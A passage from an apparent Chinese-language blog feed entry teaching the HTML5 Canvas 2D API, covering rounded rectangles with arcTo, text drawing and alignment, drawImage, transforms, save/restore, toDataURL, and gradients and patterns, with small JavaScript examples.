而不用计算复杂的起始角度与结束角度. 因此用于绘制圆角矩形等案例较多.</p><h4 id="绘制圆角矩形"><a href="#绘制圆角矩形" class="headerlink" title="绘制圆角矩形"></a>绘制圆角矩形</h4><p>封装一个函数, 用于绘制圆角矩形.</p><ul><li>参考 rect 方法, 需要坐标参数 x, y.</li><li>由于设置圆角, 因此需要设置圆角半径 cornerRadius.</li><li>还需要提供宽高.</li><li>首先绘制一个矩形边框. 但是需要考虑圆角, 虽然从 x, y 开始绘制, 但是中间要空出半径的距离.</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">100</span>, y = <span class="number">100</span>, width = <span class="number">300</span>, height = <span class="number">100</span>, cornerRadius = <span class="number">10</span>;</span><br><span class="line">ctx.strokeStyle = <span class="string">'red'</span>;</span><br><span class="line">ctx.moveTo(x + cornerRadius, y);</span><br><span class="line">ctx.lineTo(x + width - cornerRadius, y);</span><br><span class="line">ctx.moveTo(x + width, y + cornerRadius);</span><br><span class="line">ctx.lineTo(x + width, y + height - cornerRadius);</span><br><span class="line">ctx.moveTo(x + width - cornerRadius, y + height);</span><br><span class="line">ctx.lineTo(x + cornerRadius, y + height);</span><br><span class="line">ctx.moveTo(x, y + height - cornerRadius);</span><br><span class="line">ctx.lineTo(x, y + cornerRadius);</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><p>效果为 </p><p><img src="/images/缺圆角的矩形.png" alt="缺圆角的矩形"></p><p>然后再分别绘制四个角, 设置当前位置与参考点的位置. 设置当前位置为一个线端点, 然后参考点依次就是 矩形顶点 和 另一个线段的端点.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.moveTo(x + cornerRadius, y);</span><br><span class="line">ctx.arcTo(x, y, x, y + cornerRadius, cornerRadius);</span><br></pre></td></tr></table></figure><p>即可得到</p><p><img src="/images/得到一个圆角的矩形.png" alt="得到一个圆角的矩形"></p><p>同理绘制另外三个圆角</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctx.moveTo(x + width - cornerRadius, y);</span><br><span class="line">ctx.arcTo(x + width, y, x + width, y + cornerRadius, cornerRadius);</span><br><span class="line">ctx.moveTo(x + width, y + height - cornerRadius);</span><br><span class="line">ctx.arcTo(x + width, y + height, x + width - cornerRadius, y + height, cornerRadius);</span><br><span class="line">ctx.moveTo(x + cornerRadius, y + height);</span><br><span class="line">ctx.arcTo(x, y + height, x, y + height - cornerRadius, cornerRadius);</span><br></pre></td></tr></table></figure><p>即可得到</p><p><img src="/images/得到四个圆角的矩形.png" alt="得到四个圆角的矩形"></p><p>封装成方法就可以绘制更多圆角矩形了. 封装中注意 <code>beginPath()</code> 和 <code>save()</code> 和 <code>restore()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cRect</span> (<span class="params">x, y, width, height, cornerRadius, color</span>) </span>&#123;</span><br><span class="line">    ctx.save();</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.strokeStyle = color || <span class="string">'red'</span>;</span><br><span class="line">    ctx.moveTo(x + cornerRadius, y);</span><br><span class="line">    ctx.lineTo(x + width - cornerRadius, y);</span><br><span class="line">    ctx.moveTo(x + width, y + cornerRadius);</span><br><span class="line">    ctx.lineTo(x + width, y + height - cornerRadius);</span><br><span class="line">    ctx.moveTo(x + width - cornerRadius, y + height);</span><br><span class="line">    ctx.lineTo(x + cornerRadius, y + height);</span><br><span class="line">    ctx.moveTo(x, y + height - cornerRadius);</span><br><span class="line">    ctx.lineTo(x, y + cornerRadius);</span><br><span class="line">    <span class="comment">// 开始绘制四个圆角</span></span><br><span class="line">    ctx.moveTo(x + cornerRadius, y);</span><br><span class="line">    ctx.arcTo(x, y, x, y + cornerRadius, cornerRadius);</span><br><span class="line">    ctx.moveTo(x + width - cornerRadius, y);</span><br><span class="line">    ctx.arcTo(x + width, y, x + width, y + cornerRadius, cornerRadius);</span><br><span class="line">    ctx.moveTo(x + width, y + height - cornerRadius);</span><br><span class="line">    ctx.arcTo(x + width, y + height, x + width - cornerRadius, y + height, cornerRadius);</span><br><span class="line">    ctx.moveTo(x + cornerRadius, y + height);</span><br><span class="line">    ctx.arcTo(x, y + height, x, y + height - cornerRadius, cornerRadius);</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.restore();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绘制文本"><a href="#绘制文本" class="headerlink" title="绘制文本"></a>绘制文本</h2><p>绘制文本的方法</p><ul><li><code>CanvasRenderingContext2D.fillText()</code></li><li><code>CanvasRenderingContext2D.strokeText()</code></li><li><code>CanvasRenderingContext2D.measureText()</code></li></ul><p>文本样式</p><ul><li><code>CanvasRenderingContext2D.font</code></li><li><code>CanvasRenderingContext2D.textAlign</code></li><li><code>CanvasRenderingContext2D.textBaseline</code></li></ul><h3 id="绘制文字"><a href="#绘制文字" class="headerlink" title="绘制文字"></a>绘制文字</h3><p>语法:</p><ul><li><code>CanvasRenderingContext2D.strokeText(text, x, y[, maxWidth])</code></li><li><code>CanvasRenderingContext2D.fillText(text, x, y[, maxWidth])</code></li></ul><p>描述:</p><p>这两个方法的功能都是在给定的 x, y 坐标下绘制文本内容.stroke 绘制描边文字, 文字内空心. fill 绘制填充文字, 即实心文字.最后一个参数可选, 用于限制文字的总宽. 特殊条件下, 系统会自动调整文字宽度与大小以适应该参数限制.</p><h3 id="计算文本尺寸"><a href="#计算文本尺寸" class="headerlink" title="计算文本尺寸"></a>计算文本尺寸</h3><p>语法: <code>CanvasRenderingContext2D.measureText()</code></p><p>描述:</p><p>该方法返回一个文本尺寸对象, TextMetrics 对象.TextMetrics 对象属性很多, 常用的 width 属性可以获取文字的宽度.</p><h3 id="设置文字属性"><a href="#设置文字属性" class="headerlink" title="设置文字属性"></a>设置文字属性</h3><h4 id="设置文字字体"><a href="#设置文字字体" class="headerlink" title="设置文字字体"></a>设置文字字体</h4><p>语法: <code>CanvasRenderingContext2D.font = value</code></p><p>描述:</p><ul><li>该属性用于设置绘制字体的各种信息, 与 CSS 语法一致, 设置字体形状, 样式, 字号粗细等.</li><li>其顺序可以是: style | variant | weight | size/line-height | family.</li><li>默认值为 10px sans-serif</li></ul><h4 id="设置字体水平对齐方式"><a href="#设置字体水平对齐方式" class="headerlink" title="设置字体水平对齐方式"></a>设置字体水平对齐方式</h4><p>语法: <code>CanvasRenderingContext2D.textAlign = value</code></p><p>描述:</p><ul><li>该属性用于设置文字的水平对齐方式. 设置文字居中, 靠左右对齐等.</li><li>该属性可以设置的值有: start( 默认 ), end, left, right, center.</li><li>start 表示根据参考基准点的垂直直线左靠对齐</li><li>end 表示根据参考基准点的垂直直线右靠对齐</li><li>left 与 right 就是左对齐与右对齐的意思</li><li>最后 center 就是居中的含义.</li></ul><h4 id="设置字体垂直对齐方式"><a href="#设置字体垂直对齐方式" class="headerlink" title="设置字体垂直对齐方式"></a>设置字体垂直对齐方式</h4><p>语法: <code>CanvasRenderingContext2D.textBaseline = value</code></p><p>描述:</p><ul><li>该方法设置文字在垂直方向上的对齐方式.</li><li>该属性可以取值: top, middle, bottom, hanging, alphabetic, ideographic</li><li>基于参考点的直线, 其中 top, middle, buttom 分别表示靠上, 居中, 靠下对齐.</li><li>alphabetic 表示字母基线, 类似于英文字母的对齐方式. 例如 a, g, f 等字母.</li><li>ideographic 表意对齐. 使用字母对齐中超出的字母为参考. 即比字母基线略靠下.</li><li>所有的对齐方式是根据文字特点相关的. 对于中文主要使用的还是 top, bottom 和 middle.</li><li>top, middle, bottom 使用的较多</li></ul><p><code>alphabetic</code> 表示字母参考线, <code>ideographic</code> 会比它低一点, <code>hanging</code> 表示悬挂.</p><p>实际上大多数参考方式只有在特定语言中有作用, 而且与字体也有相对复杂的关系. 例如( 下图是有部分错误的 ):</p><h2 id="绘制图片"><a href="#绘制图片" class="headerlink" title="绘制图片"></a>绘制图片</h2><p>绘制图像虽然只有一个 <code>drawImage</code> 函数, 但是该函数有多重参数形式.</p><ul><li><code>CanvasRenderingContext2D.drawImage( img, dx, dy )</code></li><li><code>CanvasRenderingContext2D.drawImage( img, dx, dy, dWidth, dHeight )</code></li><li><code>CanvasRenderingContext2D.drawImage( img, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight )</code></li></ul><h3 id="绘制简单图像"><a href="#绘制简单图像" class="headerlink" title="绘制简单图像"></a>绘制简单图像</h3><p>语法: <code>CanvasRenderingContext2D.drawImage(img, dx, dy)</code></p><p>描述:</p><ul><li>使用三个参数, 允许在画布上的 任意位置 绘制图片.</li><li>参数 img 是指图片对象. 可以是 img 标签, 或者是 video 标签, 已经另一个 canvas 等.</li><li>需要注意的是如果直接添加 img 对象是不可以的, 需要等待其加载.</li></ul><p>准备一张网络图片, 绘制, 便于查看其加载过程.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 随便从百度中搜索 '美女头像', 记录一个链接地址</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">'https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3289155966,3850025949&amp;fm=116&amp;gp=0.jpg'</span>;</span><br><span class="line"><span class="comment">// 创建 img 对象</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image(); <span class="comment">// 就是 img 标签</span></span><br><span class="line"><span class="comment">// 设置 src 属性为 图片</span></span><br><span class="line">img.src = url;</span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line">ctx.drawImage( img, <span class="number">100</span>, <span class="number">100</span> );</span><br></pre></td></tr></table></figure><p>此时没有任何结果, 打开调试工具查看 Net Work;</p><p>因为加载图片需要时间, 因此将绘制的方法放在 onload 事件中.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 随便从百度中搜索 '美女头像', 记录一个链接地址</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">'https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3289155966,3850025949&amp;fm=116&amp;gp=0.jpg'</span>;</span><br><span class="line"><span class="comment">// 创建 img 对象</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image(); <span class="comment">// 就是 img 标签</span></span><br><span class="line"><span class="comment">// 设置 src 属性为 图片</span></span><br><span class="line">img.src = url;</span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    ctx.drawImage(img, <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意: 这里使用 <code>new Image()</code>与 <code>document.createElement(&#39;img&#39;)</code>是一样的.</p><h3 id="在指定区域内绘制图像"><a href="#在指定区域内绘制图像" class="headerlink" title="在指定区域内绘制图像"></a>在指定区域内绘制图像</h3><p>当图片比较大的时候, 如果使用这样的方式绘图, 那么图片可能会完全覆盖画布。因此, 需要将其控制在一个矩形区域内绘制.</p><p>语法:<code>CanvasRenderingContext2D.drawImage(img, dx, dy, dWidth, dHeight)</code></p><p>描述:</p><ul><li>参数 dWidth, dHeight 表示绘制的矩形区域. 绘制的 dx, dy 坐标决定了开始.</li><li>该方法绘制的图像会在指定范围内被压缩显示.</li></ul><p>如果希望正常显示, 需要固定一个宽度或者高度, 然后根据比例计算出另一个值. 这里假定高度是 100. 计算宽度后绘图.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">var</span> heigth = <span class="number">100</span>, width;</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    width = img.width * height / img.height;</span><br><span class="line">    ctx.drawImage( img, <span class="number">100</span>, <span class="number">100</span>, width, height );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="绘制任意图像"><a href="#绘制任意图像" class="headerlink" title="绘制任意图像"></a>绘制任意图像</h3><p>类似于 CSS 中处理按钮等小图标的技巧, 将很多的效果图集中在一张 png 格式的背景透明的图片中, 这样可以提高效率也便于维护. 那么 drawImage 同样支持该方式绘图. 在画布中的指定位子与指定区域内, 绘制图片中的某个矩形区.</p><p>语法: <code>CanvasRenderingContext2D.drawImage(img, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)</code></p><p>描述: 这里的带有 s 前缀的参数就是指图源的矩形区域.</p><p>例如将图片的 ( 100, 100, 300, 200 ) 处的内容绘制到页面的 ( 100, 100, 300, 200 ) 的位置.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.drawImage(img, <span class="number">100</span>, <span class="number">100</span>, <span class="number">300</span>, <span class="number">200</span>,  <span class="number">100</span>, <span class="number">100</span>, <span class="number">300</span>, <span class="number">200</span>);</span><br></pre></td></tr></table></figure><h2 id="变换"><a href="#变换" class="headerlink" title="变换"></a>变换</h2><p>Canvas 绘图中支持矩阵变换功能. 其中涉及的常用方法有:</p><ul><li><code>CanvasRenderingContext2D.transform()</code></li><li><code>CanvasRenderingContext2D.scale()</code></li><li><code>CanvasRenderingContext2D.translate()</code></li><li><code>CanvasRenderingContext2D.rotate()</code></li><li><code>CanvasRenderingContext2D.setTransForm()</code></li></ul><p>还有一些方法, 暂时没有普及与确定. 因此这里的几个方法才是最常用的方法.</p><h3 id="什么是变换"><a href="#什么是变换" class="headerlink" title="什么是变换"></a>什么是变换</h3><p>计算机图形学是建立在解析几何基础之上的. 也就是说所有绘制的图形都是基于坐标进行计算得到的. 那么利用坐标系位置的调整, 同样的坐标可以得到不同的效果.</p><h3 id="平移变换"><a href="#平移变换" class="headerlink" title="平移变换"></a>平移变换</h3><p>平移变换就是将原有坐标轴进行平行移动, 那么坐标轴移动后就可以使用新坐标来绘制图形了.</p><p>语法: <code>CanvasRenderingContext2D.translate(x, y)</code></p><p>描述:</p><ul><li>该方法将坐标进行平移.</li><li>x 表示水平移动, 正数向右, 负数向左.</li><li>y 表示垂直移动, 正数向下, 负数向上.</li><li>变换可以重复调用, 变换是可以累加的.</li><li>使用该变换, 常常用于绘制不同位置, 但是形状重复的图形.</li></ul><p>注意: 变换也会被 “继承”, 开启新路径后依旧保留原先变换.</p><h3 id="旋转变换"><a href="#旋转变换" class="headerlink" title="旋转变换"></a>旋转变换</h3><p>语法: <code>CanvasRenderingContext2D.rotate(radian)</code></p><p>描述:</p><ul><li>该方法将坐标轴进行旋转变换.</li><li>参数是弧度, 表示旋转的方式. 正数表示顺时针旋转, 负数表示逆时针旋转.</li><li>该变换常常用于实现旋转动画等.</li></ul><h3 id="缩放变换"><a href="#缩放变换" class="headerlink" title="缩放变换"></a>缩放变换</h3><p>语法: <code>CanvasRenderingContext2D.scale(x, y)</code></p><p>描述:</p><ul><li>该方法实现水平与垂直的缩放.</li><li>参数 x 控制水平缩放倍率. 传参 1 表示不作缩放, 传入大于 1 的数字表示扩大.</li><li>参数 y 控制垂直缩放倍率. 传参 1 表示不作缩放, 传入大于 1 的数字表示扩大.</li><li>该变换常常用于放大与缩小, 以及反转的效果.</li></ul><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>前面提到 Canvas 是含有状态的, 也就是说需要修改颜色, 直线样式, 绘图方式等效果时需要开启一个新的状态. 但是有时在绘制过程中需要修改状态, 同时绘制完当前状态后又需要回到之前的状态中继续绘制另外的形状. 那么只有再将修改过的样式载更改回来. 如果在该状态中修改的属性较多, 那么每次在回到之前状态时就有很多的代码.</p><p>Canvas 中引入了状态的保持机制. 使用 <code>CanvasRenderingContext2D.save()</code> 方法可以保存当前状态. 如果需要恢复到已经保存的状态, 只需要调用 <code>CanvasRenderingContext2D.restore()</code> 方法即可.</p><p>状态保持的机制是基于状态栈实现的. 也就是说 <code>save</code> 一次就存储一个状态. <code>restore</code> 一次就将刚刚存入的恢复. 如果 <code>save</code> 两次, 就需要 <code>restore</code> 两次, 才可以恢复到最先的状态.</p><p>一般在封装绘图的时候都会采用开始绘制之前, <code>save</code> 一次, 然后 开启一个新路径, 然后绘制结束后 <code>restore</code>, 然后再开启一个新路径. 这样保持当前状态不会对其他绘图代码构成影响.</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>canvas 在绘制图片的时候, <code>drawImage</code> 方法还支持将一个 <code>canvas</code> 绘制到另一个 <code>canvas</code> 中. 因此使用该功能, 可以在内存中完成复杂的绘图, 将绘制好的半成品再绘制到 <code>canvas</code> 中合成需要的效果.</p><h2 id="画布保存"><a href="#画布保存" class="headerlink" title="画布保存"></a>画布保存</h2><p>画布在绘制后实际上就是一张图片, 可以直接右键另存为. 同时也支持使用 js 代码将其保存为 <code>base64</code> 编码的字符串.</p><p>语法: <code>Canvas.ToDataURL(type, encoderOptions)</code></p><p>描述:</p><ul><li>该方法可以将画布转换成 base64 格式的数据</li><li>type 表示输出类型. 例如: image/png 或 image/jpeg 等</li><li>encoderOptions 表示图片输出质量, 其取值在 0 到 1 之间. 如果是 1, 表示无损压缩, 必须使用 image/jpeg 或 image/webp 才起作用</li></ul><h2 id="渐变和图案"><a href="#渐变和图案" class="headerlink" title="渐变和图案"></a>渐变和图案</h2><p>绘制图像有两个主要方法, 一个是描边, 一个是填充. 前面介绍过要设置其样式, 可以使用 <code>strokeStyle</code> 和 <code>fillStyle</code> 属性, 只需要给它们提供颜色就可以了. 但是不仅仅是颜色, 它还支持渐变和重复.</p><p>相关方法</p><ul><li><code>CanvasRenderingContext2D.createLinearGradient()</code></li><li><code>CanvasRenderingContext2D.createRadialGradient()</code></li><li><code>CanvasRenderingContext2D.createPattern()</code></li></ul><h3 id="线性渐变"><a href="#线性渐变" class="headerlink" title="线性渐变"></a>线性渐变</h3><p>语法: <code>CanvasRenderingContext2D.createLinearGradient(x0, y0, x1, y1)</code></p><p>描述:</p><ul><li>该方法返回一个 <code>CanvasGradient</code> 对象. 用于描述渐变的方式.</li><li>该方法有两个参数, 用于表示线型渐变的方向与位置.</li><li>使用的时候, 首先创建一个 <code>CanvasGradient</code> 对象, 然后利用 <code>addColorStop</code> 方法添加颜色区间.</li><li>方法语法: <code>CanvasGradient.addColorStop( rate, color )</code>.</li><li>该方法用于设置在某个比例位置的颜色是什么.<code>rate</code> 的取值是 0 到 1 之间.</li><li>可以添加多个渐变点.</li><li>然后将该对象赋值给 <code>*Style</code> 属性即可.</li></ul><p>注意: 渐变点的坐标是基于坐标轴来计算的.</p><h3 id="放射渐变"><a href="#放射渐变" class="headerlink" title="放射渐变"></a>放射渐变</h3><p>语法: <code>CanvasRenderingContext2D.createRadialGradient(x0, y0, r0, x1, y1, r1)</code></p><p>描述:</p><ul><li>该方法实现放射渐变, 渐变的是在两个圆之间. 一般会使用两个内含关系的圆.</li><li>前三个参数分别表示其中一个圆的圆心的坐标, 以及半径.</li><li>后三个参数分别表示另一个圆的圆心的坐标, 以及半径.</li><li>绘制渐变效果用法与线性渐变一样.</li></ul><h3 id="重复填充"><a href="#重复填充" class="headerlink" title="重复填充"></a>重复填充</h3><p>语法: <code>CanvasRenderingContext2D.createPattern(img, repetition)</code></p><p>描述:</p><ul><li>该方法表示使用图片来填充的设置方法. 需要两个参数, 一个是图片, 一个是重复的方式.</li><li>图片允许是 img 标签, 图片, canvas 等对象</li><li>可选择的重复方式与 CSS 一致. 有: repeat, repeat-x, repeat-y, no-repeat.</li><li>如果是 空或””, 但不是 undefined, 默认就是 repeat.</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;什么是-Canvas&quot;&gt;&lt;a href=&quot;#什么是-Canvas&quot; class=&quot;headerlink&quot; title=&quot;什么是 Canvas&quot;&gt;&lt;/a&gt;什么是 Canvas&lt;/h2&gt;&lt;p&gt;canvas 是 HTML5 提供的一个用于展示绘图效果的标签. canvas 原意画布, 帆布.在 HTML 页面中用于展示绘图效果. 最早 canvas 是苹果提出的一个方案, 今天已经在大多数浏览器中实现.&lt;/p&gt;
    
    </summary>
    
      <category term="Canvas系列" scheme="http://yoursite.com/categories/Canvas%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="canvas" scheme="http://yoursite.com/tags/canvas/"/>
    
  </entry>
  
</feed>
